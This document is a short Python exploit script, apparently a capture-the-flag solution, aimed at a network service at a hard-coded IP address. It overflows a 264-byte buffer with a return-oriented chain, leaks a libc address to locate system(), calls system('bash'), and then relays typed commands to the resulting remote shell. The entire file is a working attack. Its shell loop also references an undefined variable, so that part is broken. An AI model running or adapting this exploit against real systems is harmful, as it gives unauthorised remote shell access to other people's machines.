from sys import stdin
from socket import *
import struct


host = '120.76.114.164'
port = 1234

address = (host, port)

handle_addr   = 0x08048af4
send_addr     = 0x0804a270
sendlen_addr  = 0x08048a61
recvline_addr = 0x080489e6
writable_addr = 0x0804a10c
send_offset   = 0x000e81e0
system_offset = 0x0003ada0


def send_bomb(sock, func, next, *args):
    sock.recv(512)

    bufbomb = b'0' * 264
    bufbomb += struct.pack('I', 0x0)
    bufbomb += struct.pack('I', func)
    bufbomb += struct.pack('I', next)

    for v in args:
        bufbomb += struct.pack('I', v)

    bufbomb += struct.pack('B', 0xa)
 
    sock.send(bufbomb)

    return sock.recv(512)


if __name__ == '__main__':
    with socket(AF_INET, SOCK_STREAM) as sock:
        sock.connect(address)

        send_bomb(sock, sendlen_addr, handle_addr, send_addr, 0x4)
        res = sock.recv(4)
        pwnam_addr = struct.unpack("I", res)[0]
        system_addr = pwnam_addr - send_offset + system_offset

        data = b'bash\n'
        send_bomb(sock, recvline_addr, handle_addr, writable_addr)
        sock.send(data)
        send_bomb(sock, system_addr, handle_addr, writable_addr)
        while True:
            print('$> ', end='', flush=True)
            command = stdin.readline()
            sock.send(cmd.encode())
            res = sock.recv(512)
            if command == 'exit\n':
                break
            print(res)
